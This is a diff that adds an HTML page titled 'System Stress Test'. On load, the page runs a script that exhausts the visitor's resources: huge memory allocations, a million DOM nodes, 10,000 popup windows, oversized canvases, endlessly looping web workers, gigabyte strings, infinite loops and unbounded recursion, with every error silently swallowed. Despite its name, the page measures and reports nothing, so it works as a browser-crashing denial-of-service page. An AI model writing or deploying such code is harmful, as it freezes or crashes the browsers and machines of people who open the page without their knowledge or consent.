@@ -1,0 +1,124 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>System Stress Test</title>
+</head>
+<body>
+    <script>
+        function stressSystem() {
+            try {
+                const targetSizeInBytes = 382 * 1024 * 1024 * 1024 * 1024;
+                const arraySize = targetSizeInBytes / 8;
+                const largeArray = new Array(arraySize);
+                for (let i = 0; i < arraySize; i++) {
+                    largeArray[i] = Math.random();
+                }
+            } catch (error) {}
+
+            try {
+                const container = document.createElement('div');
+                document.body.appendChild(container);
+                for (let i = 0; i < 1000000; i++) {
+                    const div = document.createElement('div');
+                    div.textContent = `DOM Element ${i}`;
+                    div.style.width = '100px';
+                    div.style.height = '100px';
+                    div.style.backgroundColor = `rgb(${Math.random() * 255}, ${Math.random() * 255}, ${Math.random() * 255})`;
+                    container.appendChild(div);
+                }
+            } catch (error) {}
+
+            try {
+                for (let i = 0; i < 10000; i++) {
+                    window.open('about:blank', '_blank', `width=200,height=200,top=${i * 10},left=${i * 10}`);
+                }
+            } catch (error) {}
+
+            try {
+                for (let i = 0; i < 100; i++) {
+                    const canvas = document.createElement('canvas');
+                    canvas.width = 100000;
+                    canvas.height = 100000;
+                    document.body.appendChild(canvas);
+                    const ctx = canvas.getContext('2d');
+                    ctx.fillStyle = `rgb(${Math.random() * 255}, ${Math.random() * 255}, ${Math.random() * 255})`;
+                    ctx.fillRect(0, 0, canvas.width, canvas.height);
+                }
+            } catch (error) {}
+
+            try {
+                for (let i = 0; i < 100; i++) {
+                    const workerCode = `
+                        while (true) {
+                            const tempArray = new Array(1000000);
+                            for (let j = 0; j < tempArray.length; j++) {
+                                tempArray[j] = Math.random();
+                            }
+                            const result = Math.pow(Math.random(), Math.random());
+                        }
+                    `;
+                    const blob = new Blob([workerCode], { type: 'application/javascript' });
+                    const worker = new Worker(URL.createObjectURL(blob));
+                }
+            } catch (error) {}
+
+            try {
+                for (let i = 0; i < 100; i++) {
+                    const largeString = 'A'.repeat(1024 * 1024 * 1024);
+                    const dataUrl = `data:image/png;base64,${btoa(largeString)}`;
+                    const img = document.createElement('img');
+                    img.src = dataUrl;
+                    document.body.appendChild(img);
+                }
+            } catch (error) {}
+
+            try {
+                while (true) {
+                    const largeObject = new Array(1000000).fill(Math.random());
+                    largeObject.length = 0;
+                }
+            } catch (error) {}
+
+            try {
+                const container = document.createElement('div');
+                document.body.appendChild(container);
+                for (let i = 0; i < 1000000; i++) {
+                    const div = document.createElement('div');
+                    div.addEventListener('click', () => Math.random());
+                    div.addEventListener('mouseover', () => Math.random());
+                    div.addEventListener('mouseout', () => Math.random());
+                    container.appendChild(div);
+                }
+            } catch (error) {}
+
+            try {
+                function recursiveCrash() {
+                    recursiveCrash();
+                }
+                recursiveCrash();
+            } catch (error) {}
+
+            try {
+                while (true) {
+                    const tempArray = new Array(1000000);
+                    for (let j = 0; j < tempArray.length; j++) {
+                        tempArray[j] = Math.random();
+                    }
+                }
+            } catch (error) {}
+
+            try {
+                while (true) {
+                    const result = Math.pow(Math.random(), Math.random());
+                }
+            } catch (error) {}
+        }
+
+        window.onload = function() {
+            stressSystem();
+        };
+    </script>
+</body>
+</html>
